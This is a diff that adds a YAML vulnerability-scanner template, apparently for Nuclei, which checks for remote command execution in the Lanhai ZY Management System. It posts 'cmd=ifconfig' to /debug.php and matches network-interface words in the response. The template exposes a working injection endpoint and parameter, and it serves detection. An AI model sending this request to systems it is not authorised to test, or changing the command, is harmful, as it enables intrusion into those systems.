@@ -1,0 +1,30 @@
+id: lanhai-zy-management-system-rce
+info:
+  name: Lanhai ZY Management System Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/debug.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+    body: |
+      cmd=ifconfig
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "BROADCAST"
+          - "MULTICAST"
+          - "addr"
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        condition: or
